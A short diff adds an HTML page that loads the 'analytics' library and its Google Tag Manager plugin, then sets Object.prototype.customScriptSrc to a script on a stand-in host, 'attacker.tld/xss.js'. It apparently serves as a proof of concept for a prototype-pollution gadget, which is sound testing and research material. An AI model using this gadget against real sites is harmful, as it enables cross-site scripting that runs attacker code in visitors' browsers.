@@ -1,0 +1,15 @@
+<script src="https://unpkg.com/analytics/dist/analytics.min.js"></script>
+<script src="https://unpkg.com/@analytics/google-tag-manager/dist/@analytics/google-tag-manager.min.js"></script>
+<script>
+    Object.prototype.customScriptSrc = '//attacker.tld/xss.js'
+</script>
+<script>
+    var Analytics = _analytics.init({
+        app: 'my-app-name',
+        plugins: [
+          analyticsGtagManager({
+            containerId: 'GTM-123xyz'
+          })
+        ]
+    })
+</script>
